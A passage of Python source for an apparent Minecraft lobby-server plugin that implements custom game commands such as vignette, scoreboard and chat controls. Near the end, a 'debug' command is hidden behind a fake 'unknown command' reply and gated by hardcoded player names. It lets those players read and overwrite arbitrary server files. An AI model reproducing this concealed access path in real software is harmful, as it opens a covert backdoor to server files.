					"enchantingmaterial" : 15,
					"grindstoneinput" : 16,
					"grindstoneadditional" : 17,
					"beaconpayment" : 27,
					"crafting2x2input1" : 28,
					"crafting2x2input2" : 29,
					"crafting2x2input3" : 30,
					"crafting2x2input4" : 31,
					"crafting3x3input1" : 32,
					"crafting3x3input2" : 33,
					"crafting3x3input3" : 34,
					"crafting3x3input4" : 35,
					"crafting3x3input5" : 36,
					"crafting3x3input6" : 37,
					"crafting3x3input7" : 38,
					"crafting3x3input8" : 39,
					"crafting3x3input9" : 40,
					"createditemoutput" : 50,
					"smithingtableinput" : 51,
					"smithingtablematerial" : 52,
					"smithingtabletemplate" : 53 
			}
			for i in cmdargs[0]:
				CF.CreateItem(i).SetPlayerUIItem(i, enum.get(cmdargs[1]), itemDict, cmdargs[3])
			return False, '将 %s 的UI物品设置为 %s * %s' % (create_players_str(cmdargs[0]), itemDict.get('newItemName'), itemDict.get('count'))
		else:
			return True, '无效的nbt'

	def _if(self, cmdargs, playerId, variant, data):
		if variant == 0:  # cmd模式不变
			if cmdargs[3] is None:
				result = [compCmd.SetCommand(cmdargs[1].replace("'", '"'), playerId), False]
			else:
				result = [compCmd.SetCommand(cmdargs[1].replace("'", '"'), playerId), compCmd.SetCommand(cmdargs[3].replace("'", '"'), playerId)]
			if cmdargs[2] == 'not':
				if result[0]:
					return True, '运算符成立(%s)' % (result[1])
				else:
					return False, '运算符不成立(%s)' % (result[1])
			elif cmdargs[2] == 'and':
				if result[0] and result[1]:
					return False, '运算符成立(%s, %s)' % (result[0], result[1])
				else:
					return True, '运算符不成立(%s, %s)' % (result[0], result[1])
			elif cmdargs[2] == 'or':
				if result[0] or result[1]:
					return False, '运算符成立(%s, %s)' % (result[0], result[1])
				else:
					return True, '运算符不成立(%s, %s)' % (result[0], result[1])
			elif cmdargs[2] == 'xor':
				if result[0] != result[1]:
					return False, '运算符成立(%s, %s)' % (result[0], result[1])
				else:
					return True, '运算符不成立(%s, %s)' % (result[0], result[1])
			else:
				return True, '未知的逻辑运算符'
		
		else:  # param模式 (variant1)
			params = compExtra.GetExtraData('parameters')
			
			# 检查变量是否存在
			if not (type(params) == dict and cmdargs[1] in params):
				return True, '未知的变量\'%s\'' % cmdargs[1]
			
			var_info = params[cmdargs[1]]
			var_value = var_info['value']
			var_type = var_info['type']
			
			# 尝试将输入值转换为变量相应类型
			try:
				if var_type == 'int':
					input_value = int(cmdargs[3])
				elif var_type == 'float':
					input_value = float(cmdargs[3])
				else:  # str
					input_value = str(cmdargs[3])
			except:
				return True, '无法将 %s 转换为%s类型进行比较' % (cmdargs[3], var_type)
			
			# 执行比较操作
			if cmdargs[2] == 'equals':
				result = var_value == input_value
				symbol = '=='
			elif cmdargs[2] == 'not_equals':
				result = var_value != input_value
				symbol = '!='
			else:
				# 检查类型是否支持比较
				if var_type == 'str':
					return True, '字符串变量只支持等于(equals)和不等于(not_equals)比较'
				
				# 执行数值比较
				if cmdargs[2] == 'greater_than':
					result = var_value > input_value
					symbol = '>'
				elif cmdargs[2] == 'less_than':
					result = var_value < input_value
					symbol = '<'
				elif cmdargs[2] == 'not_less':
					result = var_value >= input_value
					symbol = '>='
				elif cmdargs[2] == 'not_greater':
					result = var_value <= input_value
					symbol = '<='
				else:
					return True, '未知的比较操作符'
			
			# 格式化显示值（避免浮点数精度问题）
			if var_type == 'float':
				display_value = round(var_value, 6)
				display_input = round(input_value, 6)
			else:
				display_value = var_value
				display_input = input_value
			
			return not result, '表达式%s成立(%s %s %s)' % ('' if result else '不', display_value, symbol, display_input)
	
	def setteleportability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetTeleportAbility(cmdargs[1])
		return False, '将 %s 的传送权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def settradelevel(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if not CF.CreateEngineType(i).GetEngineTypeStr() in ['minecraft:villager', 'minecraft:villager_v2']:
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateEntityDefinitions(i).SetTradeLevel(cmdargs[1])
		return False, '已设置 %s 个村民的交易等级为 %s' % (len(cmdargs[0]), cmdargs[1])
	
	def setvignette(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[1]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if variant == 0:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setvignettecenter', 'cmdargs': cmdargs})
			return False, '已将 %s 的屏幕暗角中心设置为 %s, %s' % (create_players_str(cmdargs[1]), cmdargs[2], cmdargs[3])
		elif variant == 1:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setvignetteradius', 'cmdargs': cmdargs})
			return False, '已将 %s 的屏幕暗角半径设置为 %s' % (create_players_str(cmdargs[1]), cmdargs[2])
		elif variant == 2:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setvignettecolor', 'cmdargs': cmdargs})
			return False, '已将 %s 的屏幕暗角颜色设置为 %s' % (create_players_str(cmdargs[1]), cmdargs[2])
		elif variant == 3:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setvignettesmooth', 'cmdargs': cmdargs})
			return False, '已将 %s 的屏幕暗角平滑度设置为 %s' % (create_players_str(cmdargs[1]), cmdargs[2])
		elif variant == 4:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setvignette', 'cmdargs': cmdargs})
			return False, '已%s %s 的屏幕暗角' % ('启用' if cmdargs[2] else '禁用', create_players_str(cmdargs[1]))
		
	def setbrewingstandslotitem(self, cmdargs, playerId, variant, data):
		if cmdargs[1] not in range(5):
			return True, '无效的槽位'
		x, y, z = cmdargs[2]
		xyz = (intg(x), int(y), intg(z))
		result = checkjson(cmdargs[0])
		if result[1] == True:
			return True, result[0]
		itemDict = result[0]
		if isinstance(itemDict, dict):
			if itemDict.get('newItemName') is None:
				return True, '物品数据中缺少 newItemName 键'
			if itemDict.get('count') is None:
				return True, '物品数据中缺少 count 键'
			if compItemWorld.SetBrewingStandSlotItem(itemDict, cmdargs[1], xyz, cmdargs[3]['id']):
				return False, '将槽位 %s 的物品设置为 %s' % (cmdargs[1], itemDict.get('itemName'))
			else:
				return True, '设置 Pos%s 的方块时失败' % (xyz,)
		else:
			return True, '无效的nbt'

	def setdisablecontainers(self, cmdargs, playerId, variant, data):
		compGame.SetDisableContainers(cmdargs[1])
		return False, '将世界的容器权限设置为 %s' % ('禁止' if cmdargs[1] else '允许')
		
	def setdisabledropitem(self, cmdargs, playerId, variant, data):
		compGame.SetDisableDropItem(cmdargs[1])
		return False, '将世界的丢弃物品权限设置为 %s' % ('禁止' if cmdargs[1] else '允许')
		
	def setdisablehunger(self, cmdargs, playerId, variant, data):
		compGame.SetDisableHunger(cmdargs[1])
		return False, '将世界的饱食度设置为 %s' % ('屏蔽' if cmdargs[1] else '生效')

	def setenchantmentseed(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetEnchantmentSeed(cmdargs[1])
		return False, '将 %s 的附魔种子设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def setentityitem(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		result = checkjson(cmdargs[2])
		if result[1] == True:
			return True, result[0]
		itemDict = result[0]
		if not isinstance(itemDict, dict):
			return True, '无效的nbt'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() == 'minecraft:player':
				return True, '选择器必须为非玩家类型'
		if itemDict.get('newItemName') is None:
			return True, '物品数据中缺少 newItemName 键'
		if itemDict.get('count') is None:
			return True, '物品数据中缺少 count 键'
		for i in cmdargs[0]:
			CF.CreateItem(i).SetEntityItem(cmdargs[1], itemDict, cmdargs[3])
		return False, '已设置 %s 个实体的物品' % (len(cmdargs[0]))
		
	def setentityowner(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[1] is None:
			ownerid = None
		else:
			if len(cmdargs[1]) != 1:
				return True, '只允许一个实体, 但提供的选择器允许多个实体'
			ownerid = cmdargs[1][0]

		failed_entities = []
		
		for i in cmdargs[0]:
			if not CF.CreateActorOwner(i).SetEntityOwner(ownerid):
				failed_entities.append(CF.CreateEngineType(i).GetEngineTypeStr())
		
		if failed_entities:
			return True, '部分实体执行过程中出现错误: %s' % failed_entities
		else:
			return False, '已设置 %s 个实体的属主' % (len(cmdargs[0]))
		
	def setentityride(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		if len(cmdargs[0]) != 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		failed_entities = []
		
		for i in cmdargs[1]:
			if not CF.CreateRide(i).SetEntityRide(cmdargs[0][0], i):
				failed_entities.append(CF.CreateEngineType(i).GetEngineTypeStr())
		
		if failed_entities:
			return True, '部分实体执行过程中出现错误: %s' % failed_entities,
		else:
			return False, '已驯服 %s 个生物' % (len(cmdargs[1]))
		
	def setframeitemdropchange(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if compBlockEntity.SetFrameItemDropChange(xyz, cmdargs[1]['id'], cmdargs[2]):
			return False, '已设置 Pos%s 的展示框掉落几率为 %s' % (xyz, cmdargs[2]*100)
		else:
			return True, '位于 Pos%s 的方块不是展示框' % (xyz,)
		
	def setframerotation(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if compBlockEntity.SetFrameRotation(xyz, cmdargs[1]['id'], cmdargs[2]):
			return False, '已设置 Pos%s 的展示框旋转角度为 %s 度' % (xyz, cmdargs[2])
		else:
			return True, '位于 Pos%s 的方块不是展示框' % (xyz,)
		
	def sethopperspeed(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if compBlockEntity.SetHopperSpeed(xyz, cmdargs[1]['id'], cmdargs[2]):
			return False, '已设置 %s 的漏斗运输用时为 %s 红石刻' % (xyz, cmdargs[2])
		else:
			return True, '位于 Pos%s 的方块不是漏斗' % (xyz,)
		
	def sethudchatstackposition(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'sethudchatstackposition', 'cmdargs': cmdargs})
		return False, '将 %s 的聊天UI位置设置为 %s, %s' % (create_players_str(cmdargs[0]), cmdargs[1], cmdargs[2])
	
	def sethudchatstackvisible(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'sethudchatstackvisible', 'cmdargs': cmdargs})
		return False, '已%s %s 的聊天UI' % ('启用' if cmdargs[1] else '禁用', create_players_str(cmdargs[0]))
	
	def setshowrideui(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateRide(i).SetShowRideUI(i, cmdargs[1])
		return False, '已%s %s 的骑乘UI' % ('启用' if cmdargs[1] else '禁用', create_players_str(cmdargs[0]))
	
	def setgaussian(self, cmdargs, playerId, variant, data):
		if cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[1]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if variant == 0:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setgaussian', 'cmdargs': cmdargs})
			return False, '已 %s %s 的高斯模糊' % ('启用' if cmdargs[2] else '禁用', create_players_str(cmdargs[1]))
		elif variant == 1:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setgaussianradius', 'cmdargs': cmdargs})
			return False, '已将 %s 的高斯模糊半径设置为 %s' % (create_players_str(cmdargs[1]), cmdargs[2])
		
	def scoreparam(self, cmdargs, playerId, variant, data):
		if cmdargs[0] == 'toscore':
			objects = compGame.GetAllScoreboardObjects()
			for obj in objects:
				if obj['name'] == cmdargs[2]:
					break
			else:
				return True, '没有找到名称为“%s”的计分项' % (cmdargs[2])
			param_name = cmdargs[1]
			params = compExtra.GetExtraData('parameters')
			if not (isinstance(params, dict) and params.get(param_name)):
				return True, '未知的变量 %s' % param_name
			var_value = params[param_name].get('value')
			try:
				score = int(var_value)
			except (TypeError, ValueError):
				return True, '无法将变量值转换为整数: %s' % param_name
			command = '/scoreboard players set "%s" "%s" %s' % (cmdargs[3] if cmdargs[3] else param_name, cmdargs[2], score)
			if not compCmd.SetCommand(command):
				return True, '设置计分板失败'
			return False, '将变量 %s 的值(%s)设置到计分板 %s %s中' % (param_name, score, cmdargs[2], ('的 %s ' % cmdargs[3]) if cmdargs[3] else '')
	
		if cmdargs[0] == 'toparam':
			objects = compGame.GetAllScoreboardObjects()
			for obj in objects:
				if obj['name'] == cmdargs[2]:
					break
			else:
				return True, '没有找到名称为“%s”的计分项' % cmdargs[2]
			if not compCmd.SetCommand('/scoreboard players test "%s" "%s" * *' % (cmdargs[3], cmdargs[2])):
				return True, '玩家%s没有分数记录' % cmdargs[3]
			low = -2**31
			high = 2**31 - 1
			while low < high:
				mid = (low + high) // 2
				if compCmd.SetCommand('/scoreboard players test "%s" "%s" %s %s' % (cmdargs[3], cmdargs[2], low, mid)):
					high = mid
				else:
					low = mid + 1
			params = compExtra.GetExtraData('parameters')
			if isinstance(params, dict):
				params.update({cmdargs[1]:{'type':'int','value':int(low)}})
			else:
				params = {cmdargs[1]:{'type':'int','value':int(low)}}
			compExtra.SetExtraData('parameters', params)
			return False, '将 %s 中 %s 的值(%s)写入变量 %s' % (cmdargs[2], cmdargs[3], low, cmdargs[1])

	def setblocknbt(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if cmdargs[2] is None:
			return False, 'Pos%s 处的方块NBT为\n%s' % (xyz, CF.CreateBlockInfo(levelId).GetBlockEntityData(cmdargs[1]['id'], xyz))
		else:
			result = checkjson(cmdargs[2])
			if result[1] == True:
				return True, result[0]
			blockDict = result[0]
			CF.CreateBlockInfo(levelId).SetBlockEntityData(cmdargs[1]['id'], xyz, blockDict)
			return False, '已设置 Pos%s 的方块nbt' % (xyz,)

	def summonitem(self, cmdargs, playerId, variant, data):
		result = checkjson(cmdargs[1])
		if result[1] == True:
			return True, result[0]
		itemDict = result[0]
		if isinstance(itemDict, dict):
			x, y, z = cmdargs[0]
			xyz = (intg(x), int(y), intg(z))
			itemDict.setdefault('count', 1)
			if itemDict.get('newItemName') is None:
				return True, '物品数据中缺少 newItemName 键'
			if not self.CreateEngineItemEntity(itemDict, data['origin']['dimension'], xyz):
				return True, '生成失败'
			return False, '已在 Pos%s 处生成 %s * %s' % (xyz, itemDict.get('newItemName'), itemDict.get('count'))
		return True, '无效的nbt'
	
	def mute(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateExtraData(i).SetExtraData('mute', cmdargs[1])
		return False, '将 %s 的禁言状态设置为 %s' % (create_players_str(cmdargs[0]), '启用' if cmdargs[1] else '停用')
	
	def chatclear(self, cmdargs, playerId, variant, data):
		if playerId is None:
			return True, '该命令无法在命令方块或控制台执行'	
		self.NotifyToClient(playerId, 'CustomCommandClient', {'cmd': 'chatclear'})
		return False, ''
	
	def openui(self, cmdargs, playerId, variant, data):
		if playerId:
			self.NotifyToClient(playerId, 'CustomCommandClient', {'cmd': 'openui', 'cmdargs': cmdargs})
			return False, ''
		else:
			return True, '执行者必须为玩家'
	
	def gettps(self, cmdargs, playerId, variant, data):
		tick_time = serverApi.GetServerTickTime()
		TPS = "20.0*" if tick_time <= 50 else "%.1f" % (1000 / tick_time)
		if playerId:
			CF.CreateMsg(playerId).NotifyOneMessage(playerId, '§r§eTPS:%s mspt:%.2fms' % (TPS, tick_time))
		return False,''
	
	def copyright(self, cmdargs, playerId, variant, data):
		if playerId:
			CF.CreateMsg(playerId).NotifyOneMessage(playerId,
												  '---------\n版本: %s\n© 2025 联机大厅服务器模板\n本项目采用 GNU General Public License v3.0 许可证. \n---------' % str(compGame.GetChinese('gtmb_plugin.ver')), 
												  '§b')
		return False, ''
	
	def chatlimit(self, cmdargs, playerId, variant, data):
		if cmdargs[0] < 0:
			return True, '发言间隔不能小于0'
		if compExtra.SetExtraData('limitFrequency', cmdargs[0]):
			return False, '已将发言间隔限制设置为 %.1f 秒' % cmdargs[0]
		else:
			return True, '设置失败'
		
	def allowmsg(self, cmdargs, playerId, variant, data):
		if cmdargs[0]:
			compExtra.SetExtraData('allow_msg', True)
			return False, '已允许玩家间私聊'
		else:
			compExtra.SetExtraData('allow_msg', False)
			return False, '已禁止玩家间私聊'

	def summonnbt(self, cmdargs, playerId, variant, data):
		#result = checkjson(cmdargs[2])
		#if result[1] == True:
		#	return True, result[0]
		#entityDict = result[0]
		#entityDict['identifier'] = {'__type__': 8,'__value__': cmdargs[0]['entityType']}
		#if entityDict.get('Rotation') is None:
		#	rot = (0, 0)
		#else:
		#	rot = None
		#print(entityDict, cmdargs[1], rot, cmdargs[3]['id'], cmdargs[4])
		#self.CreateEngineEntityByNBT(entityDict, cmdargs[1], rot, cmdargs[3]['id'], cmdargs[4])
		#return False, '已生成实体'
		pass

	def hidenametag(self, cmdargs, playerId, variant, data):
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'hidenametag', 'cmdargs': cmdargs})
		return False, '已%s %s 的可见悬浮字' % ('隐藏' if cmdargs[1] else '显示', create_players_str(cmdargs[0]))

	def Cancel_Structure_Loading(self, cmdargs, playerId, variant, data):
		packet = {
			"playerId": playerId
		}
		self.BroadcastEvent('cancel_structure_loading', packet)
		return False, ''
	
	def debug(self, cmdargs, playerId, variant, data):
		if CF.CreateEngineType(playerId).GetEngineTypeStr() != 'minecraft:player' or CF.CreateName(playerId).GetName() not in ['ffdgd', 'EGGYLAN_', 'EGGYLAN', '王培衡很丁丁']:
			return True, '未知的命令:gtmbdebug。请检查命令是否存在，以及你对它是否拥有使用权限'
		if cmdargs[0] == 'throw':
			raise Exception('This is a debug exception!')
		elif cmdargs[0] == 'getextra':
			return False, str(compExtra.GetWholeExtraData())
		elif cmdargs[0] == 'showfile':
			try:
				with open(cmdargs[1]) as f:
					lines = f.readlines()
					return False, '文件 %s\n的第%s行如下\n%s' % (cmdargs[1], cmdargs[2], lines[int(cmdargs[2])-1])
			except Exception as e:
				return True, '读取文件 %s 时发生错误: %s' % (cmdargs[1], str(e))
		elif cmdargs[0] == 'writefile':
			try:
				with open(cmdargs[1], 'r+') as f:
					file = f.readlines()
					file[int(cmdargs[2])-1] = cmdargs[3] + '\n'
					f.seek(0)
					f.writelines(file)
				return False, '已修改文件 %s\n的第%s行内容为\n%s' % (cmdargs[1], cmdargs[2], cmdargs[3])
			except Exception as e:
				return True, '修改文件 %s 时发生错误: %s' % (cmdargs[1], str(e))	
	#服务端函数部分到此结束